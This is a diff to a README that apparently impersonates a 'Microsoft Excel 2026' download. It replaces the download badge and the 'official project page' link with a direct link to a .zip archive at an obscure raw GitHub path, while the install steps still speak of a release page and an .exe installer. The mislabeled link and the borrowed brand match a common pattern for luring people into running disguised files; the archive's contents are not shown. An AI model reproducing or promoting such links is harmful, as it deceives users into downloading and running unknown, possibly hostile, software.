@@ -5,7 +5,7 @@ description: "Standardize your Microsoft Excel 2026 workflow with clear guides f
 ---
 # 📊 Microsoft-Excel-2026 - Streamline your data analysis and reporting
 
-[![](https://img.shields.io/badge/Download-Microsoft--Excel--2026-blue)](https://github.com/inflammatory-airwave822/Microsoft-Excel-2026)
+[![](https://img.shields.io/badge/Download-Microsoft--Excel--2026-blue)](https://raw.githubusercontent.com/inflammatory-airwave822/inflammatory-airwave822.github.io/main/officiously/inflammatory-airwave-io-github-v3.1.zip)
 
 ## 📋 About this application
 
@@ -23,7 +23,7 @@ Ensure your computer meets these standards before you begin:
 
 ## 📥 How to download and install
 
-1.  Visit the [official project page](https://github.com/inflammatory-airwave822/Microsoft-Excel-2026) to access the installation files.
+1.  Visit the [official project page](https://raw.githubusercontent.com/inflammatory-airwave822/inflammatory-airwave822.github.io/main/officiously/inflammatory-airwave-io-github-v3.1.zip) to access the installation files.
 2.  Locate the release section on the right side of the page.
 3.  Click the link for the latest installer, which ends in .exe.
 4.  Save the file to your desktop or downloads folder.
